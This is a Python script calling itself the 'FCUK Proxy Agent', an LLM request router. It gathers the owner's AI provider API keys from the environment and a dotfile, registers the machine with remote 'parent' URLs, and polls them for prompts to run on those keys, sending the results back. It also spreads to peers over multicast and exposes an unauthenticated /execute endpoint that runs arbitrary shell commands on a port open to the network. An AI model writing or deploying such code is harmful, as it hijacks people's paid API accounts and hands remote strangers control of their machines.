#!/usr/bin/env python3
import asyncio
import json
import logging
import os
import socket
import struct
import subprocess
import sys
import time
import uuid
from pathlib import Path

try:
    from aiohttp import web, ClientSession, ClientTimeout, MultipartWriter
except ImportError:
    subprocess.check_call([sys.executable, "-m", "pip", "install", "aiohttp", "-q"])
    from aiohttp import web, ClientSession, ClientTimeout

logging.basicConfig(level=logging.INFO, format="%(asctime)s [FCUK-PROXY] %(message)s")
log = logging.getLogger(__name__)

INSTALL_DIR = Path.home() / ".fcukproxy"
CONFIG_FILE = INSTALL_DIR / "machine.json"
ENV_FILE = INSTALL_DIR / ".env"
PROXY_PORT = 6000
MCAST_GRP = "239.255.255.250"
MCAST_PORT = 6002
PARENT_URLS = [
    "https://www.financecheque.uk/api/proxy",
    "https://financecheque.uk/api/proxy",
]
POLL_INTERVAL = 2
VERSION = "0.4.0"

log = logging.getLogger(__name__)

_parent_index = 0

def load_config():
    if CONFIG_FILE.exists():
        with open(CONFIG_FILE) as f:
            return json.load(f)
    cfg = {
        "machine_id": str(uuid.uuid4()),
        "machine_name": socket.gethostname(),
        "local_ip": "127.0.0.1",
        "proxy_port": PROXY_PORT,
        "parent": PARENT_URLS[0],
        "version": VERSION,
    }
    INSTALL_DIR.mkdir(parents=True, exist_ok=True)
    with open(CONFIG_FILE, "w") as f:
        json.dump(cfg, f, indent=2)
    return cfg

def load_env_keys():
    keys = {}
    if ENV_FILE.exists():
        with open(ENV_FILE) as f:
            for line in f:
                line = line.strip()
                if "=" in line and not line.startswith("#"):
                    k, v = line.split("=", 1)
                    keys[k.strip()] = v.strip()
    for key in os.environ:
        if key in ("OPENAI_API_KEY", "ANTHROPIC_API_KEY", "GEMINI_API_KEY",
                    "MISTRAL_API_KEY", "GROQ_API_KEY", "TOGETHER_API_KEY",
                    "DEEPSEEK_API_KEY", "PERPLEXITY_API_KEY", "COHERE_API_KEY",
                    "AZURE_API_KEY", "LOCAL_MODEL_PATH", "OPENROUTER_API_KEY"):
            keys[key] = os.environ[key]
    return keys

CONFIG = load_config()
ENV_KEYS = load_env_keys()

peers: dict[str, dict] = {}
stats = {"requests": 0, "routed_to_parent": 0, "routed_to_peer": 0,
         "routed_local": 0, "errors": 0}
start_time = time.time()

MODELS = [
    {"id": "proxy-router", "object": "model", "created": int(time.time()), "owned_by": "fcuk-proxy"},
    {"id": "gpt-4o-mini", "object": "model", "created": int(time.time()), "owned_by": "openai"},
    {"id": "gpt-4o", "object": "model", "created": int(time.time()), "owned_by": "openai"},
    {"id": "claude-3-haiku-20240307", "object": "model", "created": int(time.time()), "owned_by": "anthropic"},
    {"id": "claude-sonnet-4-20250514", "object": "model", "created": int(time.time()), "owned_by": "anthropic"},
    {"id": "gemini-2.0-flash", "object": "model", "created": int(time.time()), "owned_by": "google"},
    {"id": "deepseek-chat", "object": "model", "created": int(time.time()), "owned_by": "deepseek"},
]

PROVIDERS = [
    {"name": "openai", "key": "OPENAI_API_KEY", "url": "https://api.openai.com/v1/chat/completions", "model": "gpt-4o-mini"},
    {"name": "openrouter", "key": "OPENROUTER_API_KEY", "url": "https://openrouter.ai/api/v1/chat/completions", "model": "openrouter/auto"},
    {"name": "anthropic", "key": "ANTHROPIC_API_KEY", "url": "https://api.anthropic.com/v1/messages", "model": "claude-3-haiku-20240307", "anthropic": True},
    {"name": "gemini", "key": "GEMINI_API_KEY", "url": "https://generativelanguage.googleapis.com/v1beta/models/gemini-2.0-flash:generateContent", "model": "gemini-2.0-flash"},
    {"name": "deepseek", "key": "DEEPSEEK_API_KEY", "url": "https://api.deepseek.com/v1/chat/completions", "model": "deepseek-chat"},
    {"name": "groq", "key": "GROQ_API_KEY", "url": "https://api.groq.com/openai/v1/chat/completions", "model": "llama-3.3-70b-versatile"},
]

_ROUND_ROBIN = 0

async def register_with_parent():
    try:
        public_ip = "unknown"
        try:
            async with ClientSession(timeout=ClientTimeout(total=5)) as s:
                async with s.get("https://api.ipify.org?format=json") as r:
                    data = await r.json()
                    public_ip = data.get("ip", "unknown")
        except Exception:
            pass
        payload = {
            "machine_id": CONFIG["machine_id"],
            "machine_name": CONFIG["machine_name"],
            "ip_address": public_ip,
            "proxy_port": CONFIG["proxy_port"],
            "version": CONFIG["version"],
        }
        for parent in PARENT_URLS:
            try:
                async with ClientSession(timeout=ClientTimeout(total=10)) as s:
                    async with s.post(
                        f"{parent}/register",
                        json=payload,
                        headers={"X-Machine-ID": CONFIG["machine_id"]},
                    ) as r:
                        if r.status == 200:
                            log.info(f"Registered with {parent}")
                            break
                        else:
                            log.warning(f"{parent} registration failed: {r.status}")
            except Exception as e:
                log.debug(f"Could not register with {parent}: {e}")
    except Exception as e:
        log.warning(f"Registration error: {e}")

async def periodic_register():
    while True:
        await register_with_parent()
        await asyncio.sleep(60)

_polled_work_ids: set[str] = set()

async def poll_parent():
    while True:
        for parent in PARENT_URLS:
            try:
                async with ClientSession(timeout=ClientTimeout(total=10)) as s:
                    async with s.get(
                        f"{parent}/poll",
                        params={"machine_id": CONFIG["machine_id"]},
                    ) as r:
                        if r.status == 200:
                            data = await r.json()
                            if data.get("pending") and data.get("work_id"):
                                wid = data["work_id"]
                                if wid in _polled_work_ids:
                                    continue
                                _polled_work_ids.add(wid)
                                payload = data.get("payload", {})
                                log.info(f"Polled work {wid} from parent")
                                result = await route_llm(payload)
                                await post_result(parent, wid, result)
            except Exception as e:
                log.debug(f"Poll {parent} failed: {e}")
        await asyncio.sleep(POLL_INTERVAL)

async def post_result(parent_url: str, work_id: str, result: dict):
    try:
        async with ClientSession(timeout=ClientTimeout(total=10)) as s:
            await s.post(
                f"{parent_url}/result",
                json={
                    "machine_id": CONFIG["machine_id"],
                    "work_id": work_id,
                    "result": result,
                },
            )
    except Exception as e:
        log.warning(f"Failed to post result for {work_id}: {e}")

async def bpdu_sender():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
    sock.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, 2)
    payload = json.dumps({
        "machine_id": CONFIG["machine_id"],
        "machine_name": CONFIG["machine_name"],
        "ip": CONFIG["local_ip"],
        "port": PROXY_PORT,
        "version": VERSION,
    }).encode()
    while True:
        try:
            sock.sendto(payload, (MCAST_GRP, MCAST_PORT))
        except Exception:
            pass
        await asyncio.sleep(5)

async def bpdu_listener():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    try:
        sock.bind(("", MCAST_PORT))
        mreq = struct.pack("4sL", socket.inet_aton(MCAST_GRP), socket.INADDR_ANY)
        sock.setsockopt(socket.IPPROTO_IP, socket.IP_ADD_MEMBERSHIP, mreq)
    except Exception as e:
        log.warning(f"Multicast listener failed: {e}")
        return
    sock.setblocking(False)
    loop = asyncio.get_event_loop()
    while True:
        try:
            data = await loop.sock_recv(sock, 1024)
            peer = json.loads(data)
            mid = peer.get("machine_id")
            if mid and mid != CONFIG["machine_id"]:
                peers[mid] = {**peer, "last_seen": time.time()}
        except Exception:
            pass
        await asyncio.sleep(0.1)

async def peer_reaper():
    while True:
        cutoff = time.time() - 30
        stale = [k for k, v in peers.items() if v["last_seen"] < cutoff]
        for k in stale:
            del peers[k]
        await asyncio.sleep(10)

async def route_to_provider(messages: list[dict], model: str = None) -> dict:
    global _ROUND_ROBIN
    for i in range(len(PROVIDERS)):
        idx = (_ROUND_ROBIN + i) % len(PROVIDERS)
        prov = PROVIDERS[idx]
        api_key = ENV_KEYS.get(prov["key"])
        if not api_key:
            continue
        try:
            if prov.get("anthropic"):
                async with ClientSession(timeout=ClientTimeout(total=30)) as s:
                    payload = {
                        "model": model or prov["model"],
                        "messages": messages,
                        "max_tokens": 1024,
                    }
                    async with s.post(
                        prov["url"], json=payload,
                        headers={"x-api-key": api_key, "Content-Type": "application/json", "anthropic-version": "2023-06-01"},
                    ) as r:
                        if r.status == 200:
                            _ROUND_ROBIN = (idx + 1) % len(PROVIDERS)
                            data = await r.json()
                            return {
                                "choices": [{
                                    "index": 0,
                                    "message": {
                                        "role": "assistant",
                                        "content": data.get("content", [{"text": ""}])[0].get("text", ""),
                                    },
                                    "finish_reason": "stop",
                                }]
                            }
            elif prov["name"] == "gemini":
                async with ClientSession(timeout=ClientTimeout(total=30)) as s:
                    contents = [{"role": m["role"], "parts": [{"text": m["content"]}]} for m in messages]
                    payload = {"contents": contents}
                    async with s.post(
                        f"{prov['url']}?key={api_key}", json=payload,
                    ) as r:
                        if r.status == 200:
                            _ROUND_ROBIN = (idx + 1) % len(PROVIDERS)
                            data = await r.json()
                            text = ""
                            try:
                                text = data["candidates"][0]["content"]["parts"][0]["text"]
                            except (KeyError, IndexError):
                                text = json.dumps(data)
                            return {
                                "choices": [{"index": 0, "message": {"role": "assistant", "content": text}, "finish_reason": "stop"}]
                            }
            else:
                async with ClientSession(timeout=ClientTimeout(total=30)) as s:
                    payload = {
                        "model": model or prov["model"],
                        "messages": messages,
                    }
                    async with s.post(
                        prov["url"], json=payload,
                        headers={"Authorization": f"Bearer {api_key}", "Content-Type": "application/json"},
                    ) as r:
                        if r.status == 200:
                            _ROUND_ROBIN = (idx + 1) % len(PROVIDERS)
                            return await r.json()
        except Exception as e:
            log.debug(f"{prov['name']} route failed: {e}")
    return None

async def route_to_parent(messages: list[dict], model: str = None) -> dict:
    for parent in PARENT_URLS:
        try:
            async with ClientSession(timeout=ClientTimeout(total=30)) as s:
                async with s.post(
                    f"{parent}/v1/chat/completions",
                    json={"model": model or "proxy-router", "messages": messages},
                    headers={"X-Machine-ID": CONFIG["machine_id"]},
                ) as r:
                    if r.status == 200:
                        return await r.json()
        except Exception as e:
            log.debug(f"Parent {parent} failed: {e}")
    return None

async def route_llm(payload: dict, chat_only: bool = False) -> dict:
    stats["requests"] += 1
    messages = payload.get("messages", [])
    model = payload.get("model")

    result = await route_to_provider(messages, model)
    if result:
        stats["routed_local"] += 1
        return result

    result = await route_to_parent(messages, model)
    if result:
        stats["routed_to_parent"] += 1
        return result

    for mid, peer in list(peers.items()):
        try:
            async with ClientSession(timeout=ClientTimeout(total=10)) as s:
                headers = {"X-Chat-Only": "true"} if chat_only else {}
                async with s.post(
                    f"http://{peer['ip']}:{peer['port']}/v1/chat/completions",
                    json=payload,
                    headers=headers,
                ) as r:
                    if r.status == 200:
                        stats["routed_to_peer"] += 1
                        return await r.json()
        except Exception:
            pass

    stats["errors"] += 1
    return {
        "error": "No available LLM endpoint",
        "choices": [{"index": 0, "message": {"role": "assistant", "content": "No LLM available. Set API keys in ~/.fcukproxy/.env"}, "finish_reason": "stop"}],
    }

async def sse_format(data: dict) -> str:
    return f"data: {json.dumps(data)}\n\n"

async def handle_chat_stream(payload: dict, chat_only: bool) -> web.StreamResponse:
    resp = web.StreamResponse(
        status=200,
        headers={
            "Content-Type": "text/event-stream",
            "Cache-Control": "no-cache",
            "Connection": "keep-alive",
            "Access-Control-Allow-Origin": "*",
        },
    )
    await resp.prepare(request=None)

    result = await route_llm(payload, chat_only)
    content = ""
    if "choices" in result and len(result["choices"]) > 0:
        content = result["choices"][0].get("message", {}).get("content", "")

    words = content.split(" ")
    full_content = ""
    for word in words:
        chunk = full_content + word + " " if full_content else word + " "
        full_content = chunk
        delta = {
            "choices": [{
                "index": 0,
                "delta": {"content": word + " " if full_content else word + " "},
                "finish_reason": None,
            }]
        }
        await resp.write((await sse_format(delta)).encode())
        await asyncio.sleep(0.02)

    done = {
        "choices": [{
            "index": 0,
            "delta": {},
            "finish_reason": "stop",
        }]
    }
    await resp.write((await sse_format(done)).encode())
    await resp.write(b"data: [DONE]\n\n")
    return resp

async def handle_chat(request: web.Request) -> web.Response:
    try:
        payload = await request.json()
    except Exception:
        return web.json_response({"error": "Invalid JSON"}, status=400)

    chat_only = request.headers.get("X-Chat-Only", "").lower() == "true"
    stream = payload.get("stream", False)

    if stream:
        return await handle_chat_stream(payload, chat_only)

    result = await route_llm(payload, chat_only)
    return web.json_response(result)

async def handle_models(request: web.Request) -> web.Response:
    return web.json_response({
        "object": "list",
        "data": MODELS,
    })

async def handle_status(request: web.Request) -> web.Response:
    return web.json_response({
        "machine_id": CONFIG["machine_id"],
        "machine_name": CONFIG["machine_name"],
        "local_ip": CONFIG["local_ip"],
        "version": VERSION,
        "uptime_s": int(time.time() - start_time),
        "peers": len(peers),
        "peer_list": [
            {"name": p["machine_name"], "ip": p["ip"], "port": p["port"]}
            for p in peers.values()
        ],
        "stats": stats,
        "parent_urls": PARENT_URLS,
        "has_api_keys": bool(ENV_KEYS),
        "configured_providers": [
            k.replace("_API_KEY", "").lower()
            for k in ENV_KEYS if k.endswith("_API_KEY")
        ],
    })

async def handle_health(request: web.Request) -> web.Response:
    return web.json_response({"status": "ok"})

async def handle_execute(request: web.Request) -> web.Response:
    chat_only = request.headers.get("X-Chat-Only", "").lower() == "true"
    if chat_only:
        return web.json_response({
            "error": "chat_only",
            "message": "This machine is in chat-only mode. Command execution is blocked.",
        }, status=403)
    try:
        body = await request.json()
    except Exception:
        return web.json_response({"error": "Invalid JSON"}, status=400)
    command = body.get("command", "")
    if not command:
        return web.json_response({"error": "No command specified"}, status=400)
    try:
        result = subprocess.run(
            command, shell=True, capture_output=True, text=True, timeout=30
        )
        return web.json_response({
            "stdout": result.stdout,
            "stderr": result.stderr,
            "returncode": result.returncode,
        })
    except subprocess.TimeoutExpired:
        return web.json_response({"error": "Command timed out"}, status=408)
    except Exception as e:
        return web.json_response({"error": str(e)}, status=500)

async def handle_env(request: web.Request) -> web.Response:
    return web.json_response({
        "has_keys": bool(ENV_KEYS),
        "configured_providers": [
            k.replace("_API_KEY", "").lower()
            for k in ENV_KEYS if k.endswith("_API_KEY")
        ],
    })

async def handle_root(request: web.Request) -> web.Response:
    return web.json_response({
        "service": "FCUK Proxy Agent",
        "version": VERSION,
        "machine_id": CONFIG["machine_id"],
        "endpoints": {
            "chat": "POST /v1/chat/completions",
            "models": "GET /v1/models",
            "status": "GET /status",
            "health": "GET /health",
            "env": "GET /env",
            "execute": "POST /execute",
        },
        "parent_proxies": PARENT_URLS,
    })

async def main():
    app = web.Application()
    app.router.add_get("/", handle_root)
    app.router.add_post("/v1/chat/completions", handle_chat)
    app.router.add_get("/v1/models", handle_models)
    app.router.add_post("/execute", handle_execute)
    app.router.add_get("/status", handle_status)
    app.router.add_get("/health", handle_health)
    app.router.add_get("/env", handle_env)

    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, "0.0.0.0", PROXY_PORT)
    await site.start()
    log.info(f"FCUK Proxy v{VERSION} running on port {PROXY_PORT}")
    log.info(f"Machine ID: {CONFIG['machine_id']}")
    log.info(f"Parent proxies: {PARENT_URLS}")
    log.info(f"API keys configured: {list(ENV_KEYS.keys())}")

    await register_with_parent()

    await asyncio.gather(
        periodic_register(),
        poll_parent(),
        bpdu_sender(),
        bpdu_listener(),
        peer_reaper(),
    )

if __name__ == "__main__":
    asyncio.run(main())
